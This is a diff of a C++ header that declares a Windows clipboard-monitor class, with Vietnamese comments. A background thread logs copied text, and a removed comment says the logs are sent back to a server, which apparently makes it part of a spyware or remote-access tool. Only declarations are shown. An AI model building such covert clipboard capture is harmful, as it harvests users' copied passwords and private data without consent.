@@ -1,4 +1,9 @@
-﻿#pragma once
+﻿// =============================================================
+// MODULE: CLIPBOARD MONITOR (HEADER)
+// Nhiệm vụ: Theo dõi và ghi lại nội dung văn bản được Copy
+// =============================================================
+
+#pragma once
 #include <string>
 #include <vector>
 #include <mutex>
@@ -7,24 +12,23 @@
 
 class Clipboard {
 private:
-    std::string _logBuffer;       // Nơi lưu nội dung đã copy
-    std::mutex _mutex;            // Khóa bảo vệ luồng
-    std::thread _monitorThread;   // Luồng chạy ngầm
-    bool _isRunning;              // Biến kiểm soát dừng/chạy
+    std::string _logBuffer;       // Bộ đệm lưu trữ nội dung đã copy
+    std::mutex _mutex;            // Khóa bảo vệ luồng (Thread-safe)
+    std::thread _monitorThread;   // Luồng chạy ngầm giám sát
+    bool _isRunning;              // Cờ kiểm soát trạng thái chạy
 
-    // Lưu lại "số thứ tự" của lần copy trước đó
-    // Windows tự đánh số mỗi lần Clipboard thay đổi.
-    // Nếu số này thay đổi -> Có nội dung mới.
+    // Windows đánh số mỗi lần nội dung Clipboard thay đổi.
+    // Ta lưu số này để biết khi nào có dữ liệu mới.
     DWORD _lastSequenceNumber;
 
-    void RunMonitorLoop();        // Vòng lặp chính
-    std::string GetClipboardText(); // Hàm lấy dữ liệu thô từ RAM
+    void RunMonitorLoop();          // Vòng lặp chính của thread
+    std::string GetClipboardText(); // Hàm giao tiếp WinAPI để lấy text
 
 public:
     Clipboard();
     ~Clipboard();
 
-    void StartMonitoring();
-    void StopMonitoring();
-    std::string GetLogs();        // Lấy dữ liệu gửi về Server
+    void StartMonitoring();       // Bắt đầu theo dõi
+    void StopMonitoring();        // Dừng theo dõi
+    std::string GetLogs();        // Lấy dữ liệu log và xóa bộ đệm
 };
